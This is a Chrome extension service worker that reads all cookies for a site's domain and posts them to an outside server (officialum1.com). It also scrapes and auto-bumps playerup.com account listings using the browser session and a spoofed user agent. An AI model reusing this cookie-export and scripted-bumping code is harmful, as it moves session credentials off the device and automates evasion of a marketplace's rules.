
// BACKGROUND SERVICE WORKER - Bypasses CORS and handles API requests
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {

    // COOKIE SYNC
    if (request.action === "SYNC_COOKIES") {
        const url = new URL(request.url);
        const baseDomain = url.hostname.split('.').slice(-2).join('.');
        chrome.cookies.getAll({ domain: baseDomain }, async (cookies) => {
            const cookieString = cookies.map(c => `${c.name}=${c.value}`).join('; ');
            fetch("https://officialum1.com/api/admin/settings", {
                method: "POST",
                headers: { "Content-Type": "application/json", "X-Admin-Password": request.adminPass },
                body: JSON.stringify({ action: "save_session", site: baseDomain, cookies: cookieString })
            })
                .then(res => res.ok ? sendResponse({ success: true }) : sendResponse({ success: false }))
                .catch(() => sendResponse({ success: false }));
        });
        return true;
    }

    // REMOTE DASHBOARD COMMANDS (Underground Mode - No Tabs)
    if (request.action === "REMOTE_SYNC" || request.action === "REMOTE_BUMP") {
        const isSync = request.action === "REMOTE_SYNC";

        chrome.storage.local.get(['admin_pass'], async (res) => {
            const adminPass = res.admin_pass;

            if (isSync) {
                try {
                    let page = 1;
                    let totalPushed = 0;

                    while (page <= 5) {
                        const url = `https://www.playerup.com/accounts/-/postings${page > 1 ? '?page=' + page : ''}`;
                        const response = await fetch(url, {
                            credentials: 'include',
                            headers: {
                                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
                            }
                        });

                        if (!response.ok) break;
                        const html = await response.text();

                        // Robust Regex for Threads
                        const threadRegex = /href="([^"]*\/threads\/[^"]+\.\d+\/?)"[^>]*>([^<]+)<\/a>/g;
                        const listings = [];
                        let match;
                        while ((match = threadRegex.exec(html)) !== null) {
                            let threadUrl = match[1];
                            // Resolve relative URLs to Absolute
                            if (threadUrl.startsWith('/')) threadUrl = "https://www.playerup.com" + threadUrl;
                            if (!threadUrl.startsWith('http')) threadUrl = "https://www.playerup.com/" + threadUrl;

                            listings.push({ url: threadUrl, title: match[2].trim() });
                        }

                        if (listings.length === 0) break;

                        const pushRes = await fetch("https://officialum1.com/api/admin/playerup", {
                            method: "POST",
                            headers: { "Content-Type": "application/json", "X-Admin-Password": adminPass },
                            body: JSON.stringify({ action: "turbo_sync", listings })
                        });

                        const pushData = await pushRes.json();
                        totalPushed += (pushData.count || 0);

                        page++;
                        await new Promise(r => setTimeout(r, 1200));
                    }
                } catch (e) { console.error("Sync Error:", e); }
            } else {
                try {
                    const listRes = await fetch("https://officialum1.com/api/admin/playerup");
                    const data = await listRes.json();
                    let targets = Array.isArray(data) ? data : (data.listings || []);
                    if (request.limit > 0) targets = targets.slice(0, request.limit);

                    for (const item of targets) {
                        const upUrl = item.url.replace(/\/$/, '') + '/up';
                        await fetch(upUrl, {
                            credentials: 'include',
                            headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" }
                        });
                        await new Promise(r => setTimeout(r, 800));
                    }
                } catch (e) { console.error("Bump Error:", e); }
            }
        });

        sendResponse({ success: true });
        return true;
    }

    // SYNC DATA TO SERVER
    if (request.action === "SYNC_TO_SERVER") {
        fetch("https://officialum1.com/api/admin/playerup", {
            method: "POST",
            headers: { "Content-Type": "application/json", "X-Admin-Password": request.adminPass },
            body: JSON.stringify({ action: "turbo_sync", listings: request.listings })
        })
            .then(res => res.json())
            .then(data => sendResponse({ success: true, count: data.count }))
            .catch(err => sendResponse({ success: false, error: err.message }));
        return true;
    }
});
